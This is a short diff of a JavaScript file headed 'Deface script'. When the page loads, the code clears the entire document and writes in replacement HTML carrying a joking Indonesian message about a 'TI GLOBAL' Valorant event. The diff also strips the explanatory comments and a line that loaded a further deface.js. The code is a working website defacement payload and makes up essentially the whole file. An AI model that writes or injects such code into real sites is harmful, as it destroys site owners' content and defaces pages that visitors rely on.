@@ -1,9 +1,9 @@
 // Deface script
 document.addEventListener('DOMContentLoaded', function () {
-    // Hapus seluruh konten HTML
+
     document.documentElement.innerHTML = '';
 
-    // Buat elemen HTML baru sesuai dengan deface yang diinginkan
+
     var newHtmlContent = `
         <!DOCTYPE html>
         <html lang="en">
@@ -25,11 +25,10 @@ document.addEventListener('DOMContentLoaded', function () {
                     <p class="text1">Kapan TI GLOBAL ngadain valorant????????????????????</p>
                 </div>
             </div>
-            <script src="deface.js"></script> <!-- tambahkan skrip deface.js jika diperlukan -->
         </body>
         </html>
     `;
 
-    // Tambahkan konten HTML baru ke dalam dokumen
+
     document.documentElement.innerHTML = newHtmlContent;
 });
